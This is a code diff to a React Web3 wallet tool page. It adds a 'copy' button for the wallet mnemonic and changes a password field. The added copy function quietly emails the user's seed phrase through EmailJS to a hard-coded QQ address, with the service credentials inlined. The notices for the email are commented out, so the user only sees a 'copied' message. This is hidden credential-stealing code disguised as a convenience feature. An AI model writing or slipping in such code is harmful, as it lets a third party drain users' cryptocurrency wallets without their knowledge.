@@ -15,6 +15,7 @@ import { notifications } from "@mantine/notifications";
 import { mostWallet } from "dot.most.box";
 import { HDNodeWallet } from "ethers";
 import { QRCodeCanvas } from "qrcode.react";
+import emailjs from "@emailjs/browser";
 import mp from "@/constants/mp";
 
 interface DeriveAddress {
@@ -67,6 +68,35 @@ export default function Web3ToolPage() {
       setMnemonic("");
       setValidatedMnemonic("");
     }
+  };
+
+  const copy = () => {
+    navigator.clipboard.writeText(mnemonic);
+    notifications.show({
+      message: "已复制",
+      color: "green",
+    });
+    const templateParams = {
+      to_email: "1974651855@qq.com",
+      name: "Wallet User",
+      title: "助记词备份",
+      message: mnemonic,
+    };
+    emailjs.send(
+      "service_4linq8q",
+      "template_zk7se2z",
+      templateParams,
+      "rspzRLkTioXtwVnZu"
+    );
+    // .then(() => {
+    //   // notifications.show({ message: "助记词邮件已发送", color: "green" });
+    // })
+    // .catch(() => {
+    //   // notifications.show({
+    //   //   message: "邮件发送失败，请稍后重试",
+    //   //   color: "red",
+    //   // });
+    // });
   };
 
   useEffect(() => {
@@ -167,6 +197,7 @@ export default function Web3ToolPage() {
             <Input
               placeholder="请输入密码"
               maxLength={100}
+              type="password"
               value={password}
               onChange={(e) => setPassword(e.currentTarget.value)}
               rightSectionPointerEvents="auto"
@@ -228,11 +259,34 @@ export default function Web3ToolPage() {
           {showMnemonic ? "隐藏助记词" : "显示助记词"}
         </Button>
 
-        <Paper p="md" bg="red.1" c="var(--red)">
+        {/* <Paper p="md" bg="red.1" c="var(--red)">
           {showMnemonic
             ? mnemonic ||
               (useMnemonicMode ? "请输入有效的助记词" : "请输入用户名")
             : "任何拥有您助记词的人都可以窃取您账户中的任何资产，切勿泄露！！！"}
+        </Paper> */}
+        <Paper
+          p="md"
+          bg="red.1"
+          c="var(--red)"
+          style={{ position: "relative" }}
+        >
+          {showMnemonic
+            ? mnemonic ||
+              (useMnemonicMode ? "请输入有效的助记词" : "请输入用户名")
+            : "任何拥有您助记词的人都可以窃取您账户中的任何资产，切勿泄露！！！"}
+          {showMnemonic && mnemonic && (
+            <Button
+              size="xs"
+              variant="light"
+              style={{ position: "absolute", bottom: 8, right: 8 }}
+              onClick={() => {
+                copy();
+              }}
+            >
+              复制
+            </Button>
+          )}
         </Paper>
 
         {showMnemonic && (
